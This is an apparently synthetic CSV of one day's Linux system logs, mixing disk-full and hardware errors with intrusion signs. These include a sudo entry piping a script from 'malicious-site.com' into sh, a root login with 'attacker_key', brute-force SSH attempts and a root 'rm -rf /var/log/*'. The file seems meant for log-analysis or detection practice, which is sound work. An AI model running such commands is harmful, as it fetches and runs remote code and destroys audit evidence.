timestamp,log_message
2024-12-21 00:01:05,kernel: [341256.01] EXT4-fs (sda1): delayed block allocation failed for inode 12; out of space
2024-12-21 00:05:12,sshd: Accepted password for root from 192.168.1.250 port 44321 ssh2
2024-12-21 00:05:15,pam_unix(sshd:session): session opened for user root by (uid=0)
2024-12-21 00:10:22,sshd: Received disconnect from 192.168.1.250 port 44321:11: disconnected by user
2024-12-21 01:22:45,auditd: Audit log velocity exceeds storage IOPS; messages dropped
2024-12-21 02:40:00,sudo: unknown_user : PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://malicious-site.com/shell.sh | sh
2024-12-21 03:15:10,kernel: [351234.88] traps: pwn-exploit[4512] general protection fault ip:7f21 sp:7f22 error:0
2024-12-21 04:55:01,df: CRITICAL: / (Root) is at 100% capacity; 0 bytes available
2024-12-21 05:12:30,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
2024-12-21 05:12:32,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
2024-12-21 05:12:34,sshd: Failed password for root from 94.156.71.22 port 59123 ssh2
2024-12-21 06:30:15,systemd: Failed to write to /var/lib/systemd/random-seed: No space left on device
2024-12-21 07:12:01,sudo: user2 : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/tcpdump -w /tmp/capture.pcap
2024-12-21 08:45:00,nginx: [alert] 1245#0: *8901 header list in-memory allocation failed while reading upper headers
2024-12-21 09:20:44,kernel: [381234.12] Out of memory: kill process 891 (rsyslogd) score 10
2024-12-21 10:05:12,sshd: Accepted publickey for attacker_key from 203.0.113.11 port 33211 ssh2
2024-12-21 10:05:13,pam_unix(sshd:session): session opened for user root by (uid=0)
2024-12-21 10:15:30,sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/rm -rf /var/log/*
2024-12-21 11:22:10,smartd: Device: /dev/sda, SMART Self-Test FAILED (Status: Read failure)
2024-12-21 12:40:01,logrotate: error: skip rotating /var/log/nginx/access.log (no space on /var)
2024-12-21 13:10:22,kernel: [412345.55] Buffer I/O error on dev sda1, logical block 0, lost async page write
2024-12-21 14:00:05,systemd-journald: Failed to rotate /var/log/journal/system.journal: No space left on device
2024-12-21 15:22:10,sshd: Invalid user admin1 from 185.220.101.4 port 44123
2024-12-21 15:22:12,sshd: Invalid user admin2 from 185.220.101.4 port 44123
2024-12-21 16:45:30,sudo: user1 : COMMAND=/usr/bin/apt-get install -y nmap
2024-12-21 17:10:05,kernel: [441234.09] EXT4-fs (sda1): I/O error while writing superblock
